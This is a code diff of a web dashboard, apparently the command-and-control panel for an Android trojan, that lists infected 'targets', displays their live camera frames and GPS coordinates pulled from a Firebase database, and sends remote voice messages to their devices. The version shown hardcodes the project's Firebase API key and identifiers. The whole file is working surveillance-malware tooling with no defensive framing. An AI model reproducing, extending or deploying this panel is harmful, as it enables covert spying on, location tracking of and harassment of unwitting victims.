@@ -3,11 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Monitoring V1.9 - Permission Fixed</title>
+    <title>C.R Monitoring V1.5 - Pro Streamer</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
         .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
+        .tab-btn.active { border-color: #ff0000; color: #ff0000; }
         .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
         #stream-img { width: 100%; height: 100%; object-fit: contain; background: #000; }
@@ -17,49 +19,54 @@
     <div class="max-w-6xl mx-auto">
         <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
-                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.9</h1>
-                <p class="text-xs text-gray-500 text-green-400">SECURE PROTOCOL ACTIVE</p>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.5</h1>
+                <p class="text-xs text-gray-500 text-green-400">STEALTH & OPTIMIZED MODE</p>
             </div>
-            <div id="auth-info" class="text-[10px] text-gray-400 font-mono">Status: Connecting...</div>
+            <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
         </header>
 
         <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <!-- Target Status -->
             <div class="lg:col-span-1 border-r border-green-900 pr-4">
-                <h2 class="text-lg font-bold mb-4 uppercase text-red-500 text-sm">Target Sessions</h2>
-                <div id="victim-list" class="space-y-2 text-[10px]">
-                    <div class="text-gray-600 italic">Awaiting secure handshake...</div>
+                <h2 class="text-lg font-bold mb-4">ACTIVE TARGETS</h2>
+                <div id="victim-list" class="space-y-2">
+                    <div class="text-xs text-gray-600 italic">Listening for incoming connections...</div>
                 </div>
             </div>
 
+            <!-- Dashboard -->
             <div class="lg:col-span-3">
+                <div class="flex space-x-4 mb-4 border-b border-gray-800">
+                    <div class="tab-btn active" id="tab-live">LIVE FEED & INTEL</div>
+                </div>
+
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <!-- Video Section -->
                     <div class="glitch-border p-4 bg-black relative">
                         <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs text-red-500 font-bold uppercase">Live Interface</span>
+                            <span class="text-xs text-red-500 font-bold uppercase">Cam Stream</span>
                             <span class="live-indicator" id="live-status">● IDLE</span>
                         </div>
                         <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900 overflow-hidden">
                             <img id="stream-img" src="" class="hidden">
-                            <div id="placeholder" class="text-gray-700 text-[10px] text-center p-4">
-                                NO ACTIVE STREAM DETECTED
-                            </div>
+                            <span id="placeholder" class="text-gray-700">Waiting for stream...</span>
                         </div>
-                        <div class="mt-4 p-3 bg-gray-950 border border-green-900 rounded flex justify-between items-center">
-                            <div>
-                                <p class="text-[9px] text-green-500 uppercase font-bold">GPS Data:</p>
-                                <p class="text-xs text-white font-mono" id="lat-long">WAITING...</p>
-                            </div>
-                            <a id="map-link" href="#" target="_blank" class="bg-blue-600 text-[9px] text-white px-3 py-1 rounded hidden uppercase font-bold hover:bg-blue-500 transition-colors">Open Maps</a>
+                        <div class="mt-4 p-2 bg-gray-900 border border-green-900 rounded">
+                            <p class="text-[10px] text-green-500 uppercase font-bold mb-1">Geoloc Intel:</p>
+                            <p class="text-xs text-white" id="lat-long">Coords: 0.0, 0.0</p>
+                            <a id="map-link" href="#" target="_blank" class="text-[10px] text-blue-400 underline hidden mt-1">OPEN IN GOOGLE MAPS</a>
                         </div>
                     </div>
 
+                    <!-- Control Section -->
                     <div class="glitch-border p-4 bg-black flex flex-col">
-                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-xs">Voice Command</h3>
-                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2 focus:border-blue-400 transition-all" placeholder="Enter text to speak on target device..."></textarea>
-                        <button id="send-voice" class="bg-blue-700 text-white font-bold py-3 hover:bg-blue-600 transition-all uppercase text-xs">Execute Voice</button>
+                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Voice Intercom</h3>
+                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none mb-2" placeholder="Ketik pesan suara ke target..."></textarea>
+                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-3 hover:bg-blue-700 transition-all uppercase text-xs">Broadcast Voice</button>
                         
-                        <div class="mt-4 pt-2 border-t border-gray-800">
-                            <button id="purge-btn" class="text-[9px] text-red-600 uppercase hover:underline">Flush Target Buffers</button>
+                        <div class="mt-4 p-2 bg-red-900 bg-opacity-20 border border-red-900 rounded">
+                            <p class="text-[10px] text-red-500 font-bold">System Command:</p>
+                            <button id="purge-btn" class="text-[10px] text-white underline mt-1">Nuke All Stream Buffers</button>
                         </div>
                     </div>
                 </div>
@@ -69,109 +76,79 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, doc, setDoc, getDocs, deleteDoc, query } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
+        import { getFirestore, collection, onSnapshot, doc, setDoc, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Environment Config
-        const firebaseConfig = JSON.parse(__firebase_config);
-        const app = initializeApp(firebaseConfig);
-        const auth = getAuth(app);
-        const db = getFirestore(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
-
-        // Secure Authentication Flow (Rule 3)
-        const initAuth = async () => {
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (error) {
-                console.error("Auth Error:", error);
-                document.getElementById('auth-info').innerText = "Auth Failed";
-            }
+        const firebaseConfig = {
+            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
+            authDomain: "apktroj.firebaseapp.com",
+            projectId: "apktroj",
+            storageBucket: "apktroj.firebasestorage.app",
+            messagingSenderId: "943833619122",
+            appId: "1:943833619122:web:d757ced4d56267abf247ab"
         };
 
-        onAuthStateChanged(auth, (user) => {
-            if (user) {
-                document.getElementById('auth-info').innerText = "SECURE SESSION: " + user.uid.substring(0,12);
-                startMonitoring(user);
-            } else {
-                initAuth();
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "apktroj_v1";
+
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) await signInAnonymously(auth);
+            else {
+                document.getElementById('auth-info').innerText = "CMD ACTIVE: " + user.uid;
+                initMonitor();
             }
         });
 
-        function startMonitoring(user) {
-            if (!user) return;
-
-            // Secure path for public data (Rule 1)
-            const collectionPath = ['artifacts', appId, 'public', 'data', 'stream_buffer'];
-            const streamCol = collection(db, ...collectionPath);
-
-            // Listener with error callback (Requirement)
+        function initMonitor() {
+            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
             onSnapshot(streamCol, (snap) => {
                 const list = document.getElementById('victim-list');
-                if(!snap.empty) {
-                    list.innerHTML = '';
-                    document.getElementById('live-status').innerText = "● ACTIVE FEED";
-                }
+                if(!snap.empty) list.innerHTML = '';
                 
                 snap.forEach(docSnap => {
                     const data = docSnap.data();
                     const img = document.getElementById('stream-img');
                     const ph = document.getElementById('placeholder');
                     
+                    // Update Victim List
                     const v = document.createElement('div');
-                    v.className = "p-2 border border-green-900 bg-green-900 bg-opacity-10 mb-1 flex justify-between items-center";
-                    v.innerHTML = `<span>AGENT_${data.uid?.substring(0,5)}</span><span class="text-[8px] bg-red-600 text-white px-1 rounded">STREAMING</span>`;
+                    v.className = "p-2 border border-green-900 text-[10px] bg-green-900 bg-opacity-10";
+                    v.innerText = `TARGET_${data.uid?.substring(0,6)} (LIVE)`;
                     list.appendChild(v);
 
                     if (data.frame) {
                         img.src = data.frame;
                         img.classList.remove('hidden');
                         ph.classList.add('hidden');
+                        document.getElementById('live-status').innerText = "● STREAMING";
                     }
 
                     if (data.location) {
-                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
+                        document.getElementById('lat-long').innerText = `Coords: ${data.location.lat}, ${data.location.lng}`;
                         const mLink = document.getElementById('map-link');
                         mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                         mLink.classList.remove('hidden');
                     }
                 });
-            }, (error) => {
-                console.error("Firestore Permission Error:", error);
-                document.getElementById('auth-info').innerText = "Access Denied (Permission)";
             });
         }
 
         document.getElementById('send-voice').onclick = async () => {
-            if (!auth.currentUser) return;
             const txt = document.getElementById('voice-msg').value;
             if(!txt) return;
-
-            try {
-                // Secure Command Path
-                await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
-                    text: txt,
-                    timestamp: Date.now()
-                });
-                document.getElementById('voice-msg').value = "";
-            } catch (e) {
-                console.error("Write Error:", e);
-            }
+            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
+                text: txt,
+                timestamp: Date.now()
+            });
+            document.getElementById('voice-msg').value = "";
         };
 
         document.getElementById('purge-btn').onclick = async () => {
-            if (!auth.currentUser) return;
-            try {
-                const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
-                const deletePromises = snap.docs.map(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
-                await Promise.all(deletePromises);
-            } catch (e) {
-                console.error("Purge Error:", e);
-            }
+            const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
+            snap.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
+            alert("Buffers cleared.");
         };
     </script>
 </body>
